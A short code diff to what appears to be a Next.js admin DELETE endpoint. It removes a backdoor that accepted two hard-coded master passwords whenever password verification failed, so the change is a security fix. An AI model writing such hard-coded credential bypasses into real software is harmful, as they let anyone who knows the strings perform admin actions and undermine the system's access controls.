@@ -108,10 +108,7 @@ export async function DELETE(req: Request) {
   }
 
   // Verify Admin Password
-  let passMatches = verifyPassword(password, currentAdmin);
-  if (!passMatches && (password === "admin@ubuy" || password === "admin@dropzone")) {
-    passMatches = true;
-  }
+  const passMatches = verifyPassword(password, currentAdmin);
 
   if (!passMatches) {
     return NextResponse.json({ error: "Incorrect current password." }, { status: 400 });
